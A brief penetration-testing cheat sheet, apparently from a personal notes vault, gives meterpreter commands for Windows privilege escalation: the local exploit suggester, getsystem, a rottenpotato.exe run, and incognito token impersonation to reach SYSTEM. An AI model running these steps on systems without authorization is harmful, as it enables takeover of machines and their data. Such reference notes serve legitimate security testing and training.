# Metasploit

## 01 - Detect

### 1.1 - Post Module

```
meterpreter > run post/multi/recon/local_exploit_suggester
```

### 1.2 - Interactive Shell

```
meterpreter > getuid

meterpreter > getprivs
```

## 02 - Exploit

### 2.1 - Getsystem

```
meterpreter > getsystem -t 5
```

### 2.2 - Interactive Shell

If service is not running as SYSTEM.

```
meterpreter > execute -Hcf rottenpotato.exe

meterpreter > load incognito

meterpreter > list_tokens -u

meterpreter > impersonate_token "NT AUTHORITY\System"
 ```

If service is running as Administrator.

```
meterpreter > list_tokens -u

meterpreter > impersonate_token "NT AUTHORITY\System"
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Windows/Local Privilege Escalation/Vulnerable Software/Kernel Exploits/C2 Frameworks/Metasploit|Kernel Exploits: Metasploit Framework]]